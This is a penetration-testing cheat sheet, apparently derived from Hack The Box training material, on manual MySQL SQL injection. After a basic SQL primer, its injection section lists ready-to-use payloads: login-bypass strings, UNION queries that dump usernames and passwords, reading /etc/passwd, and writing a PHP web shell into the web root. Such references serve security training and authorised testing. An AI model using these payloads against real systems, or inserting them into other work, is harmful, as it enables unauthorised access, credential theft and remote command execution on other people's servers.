---
title: "SQL Injection Fundamentals"
description: "Manual SQL injection: auth bypass, UNION, error/blind, DB fingerprinting and file read/write."
category: web
tags: [web, sql-injection, injection]
tools: [MySQL client]
difficulty: intermediate
updated: "2026-08-09"
source: "repo:HTB/cheatsheet-sql-injection-fundamentals.pdf"
---

# SQL Injection Fundamentals

Manual MySQL/MariaDB injection reference: SQL primer, auth bypass, UNION-based extraction, database enumeration, privilege checks, and file read/write.

## MySQL Primer

### General

```sql
-- Login to a MySQL database
mysql -u root -h docker.hackthebox.eu -P 3306 -p

-- List available databases
SHOW DATABASES;

-- Switch to a database
USE users;
```

### Tables

```sql
-- Add a new table
CREATE TABLE logins (id INT, ...);

-- List available tables in the current database
SHOW TABLES;

-- Show table properties and columns
DESCRIBE logins;

-- Add values to a table
INSERT INTO table_name VALUES (value_1, ...);

-- Add values to specific columns in a table
INSERT INTO table_name(column2, ...) VALUES (column2_value, ...);

-- Update table values
UPDATE table_name SET column1=newvalue1, ... WHERE <condition>;
```

### Querying Data

```sql
-- Show all columns in a table
SELECT * FROM table_name;

-- Show specific columns
SELECT column1, column2 FROM table_name;

-- Delete a table
DROP TABLE logins;

-- Add a new column
ALTER TABLE logins ADD newColumn INT;

-- Rename a column
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;

-- Change a column datatype
ALTER TABLE logins MODIFY oldColumn DATE;

-- Delete a column
ALTER TABLE logins DROP oldColumn;
```

### Output Control

```sql
-- Sort by column
SELECT * FROM logins ORDER BY column_1;

-- Sort by column, descending
SELECT * FROM logins ORDER BY column_1 DESC;

-- Sort by two columns
SELECT * FROM logins ORDER BY column_1 DESC, id ASC;

-- Only show first two results
SELECT * FROM logins LIMIT 2;

-- Only show two results starting from index 1
SELECT * FROM logins LIMIT 1, 2;

-- List results that meet a condition
SELECT * FROM table_name WHERE <condition>;

-- List results where a name is similar to a given string
SELECT * FROM logins WHERE username LIKE 'admin%';
```

## MySQL Operator Precedence

From highest to lowest:

1. Division (`/`), Multiplication (`*`), and Modulus (`%`)
2. Addition (`+`) and Subtraction (`-`)
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. NOT (`!`)
5. AND (`&&`)
6. OR (`||`)

## SQL Injection

### Auth Bypass

```sql
-- Basic auth bypass
admin' or '1'='1

-- Basic auth bypass with comments
admin')-- -
```

### UNION Injection

```sql
-- Detect number of columns using ORDER BY
' order by 1-- -

-- Detect number of columns using UNION injection
cn' UNION select 1,2,3-- -

-- Basic UNION injection
cn' UNION select 1,@@version,3,4-- -

-- UNION injection for 4 columns
UNION select username, 2, 3, 4 from passwords-- -
```

### DB Enumeration

```sql
-- Fingerprint MySQL with query output
SELECT @@version

-- Fingerprint MySQL with no output (time-based)
SELECT SLEEP(5)

-- Current database name
cn' UNION select 1,database(),2,3-- -

-- List all databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- List all tables in a specific database
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- List all columns in a specific table
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Dump data from a table in another database
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

### Privileges

```sql
-- Find current user
cn' UNION SELECT 1, user(), 3, 4-- -

-- Find if the user has admin privileges
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Find all user privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -

-- Find which directories can be accessed through MySQL
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### File Injection

```sql
-- Read a local file
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

-- Write a string to a local file
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- Write a web shell into the base web directory
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

> **Note —** `INTO OUTFILE` write access depends on the `secure_file_priv` setting and filesystem permissions of the MySQL service account. `LOAD_FILE` is similarly constrained.
